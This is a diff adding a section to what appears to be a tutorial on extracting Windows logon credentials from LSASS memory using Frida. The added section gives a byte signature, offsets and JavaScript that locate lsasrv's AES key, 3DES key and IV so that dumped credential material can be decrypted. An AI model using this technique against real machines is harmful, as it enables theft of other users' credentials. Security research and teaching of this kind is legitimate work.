@@ -240,3 +240,24 @@ function getPrimaryCredentialsFromLogonSession(ptr) {
 ```
 
 Now we have the username, domain name, and credential material. We're not done yet, though. As you might have guessed from the code block above, the credential material is encrypted and is useless to us in its current format. If we want to make use of it, we're going to need to go hunting for decryption keys.
+
+## Finding the Keys
+
+In order to be sure we can decrypt whatever credentials we have obtained from *lsasrv!LogonSessionList*, we will need to identify three variables: these are *lsasrv!hAesKey*, *lsasrv:h3DesKey* and *lsasrv!InitializationVector*. The process for obtaining these is exactly the same as for *LogonSessionList*; we need to use some predetermined signature and offset to find an instruction that dereferences them. We can reuse our function from before to do this:
+
+```javascript
+var lsasrv = Process.getModuleByName("lsasrv.dll")
+var sequence = "83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15"; 
+
+// LsaInitializeProtectedMemory Signature + 0xD = lsasrv!hAesKey
+// LsaInitializeProtectedMemory Signature - 0x5C = lsasrv!h3DesKey
+// LsaInitializeProtectedMemory Signature + 0x40 = IV for AES Key
+
+Memory.scan(lsasrv.base, lsasrv.size, sequence, {
+	onMatch(signature, size) {
+		var aesKey = findDereferencedAddress(signature, 0xD);
+		var tripleDesKey = findDereferencedAddress(signature, -0x5C);
+		var aesIV = findDereferencedAddress(signature, 0x40);
+	}
+});
+```
